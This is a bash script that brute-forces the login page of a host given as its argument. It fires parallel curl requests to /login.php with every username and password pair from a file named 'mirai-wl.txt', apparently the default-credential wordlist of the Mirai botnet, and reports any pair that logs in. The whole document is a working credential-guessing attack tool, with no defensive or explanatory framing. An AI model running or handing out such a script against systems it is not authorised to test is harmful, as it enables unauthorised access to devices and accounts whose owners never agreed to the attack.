#!/usr/bin/bash

PIDS=()
BASE_URL="$1"

if [ -z "$BASE_URL" ]; then
        echo "Usage: $0 <host>"
        exit 1
fi

BASE_URL="http://$BASE_URL"

curl --silent --connect-timeout 5 "$BASE_URL/login.php?username=1&password=1&id=1" &>/dev/null
rc=$?

if [ $rc -ne 0 ]; then
        echo "Connection timeout after 5 seconds. Exit"
        exit 1
fi

try_login() {
        id=$1
        user=$2
        password=$3

        r=$(curl --silent "$BASE_URL/login.php?username=$user&password=$password&id=$id")
        rc=$?
        if [[ $r == loginok ]] || [[ $r == sessionexists ]]; then
                echo "$user:$password = $r ($rc)"
        fi
}

ID=$RANDOM

while IFS= read -r user; do
        while IFS= read -r password; do
                try_login $ID "$user" "$password" &
                PIDS+=("$!")
        done < <(cat mirai-wl.txt | cut -d' ' -f2 | sort | uniq)
done < <(cat mirai-wl.txt | cut -d' ' -f1 | sort | uniq)

echo "Wait for initialization .. ($(echo ${#PIDS[@]}) tries)"
sleep 5

for i in ${PIDS[@]}; do
        wait $i
done
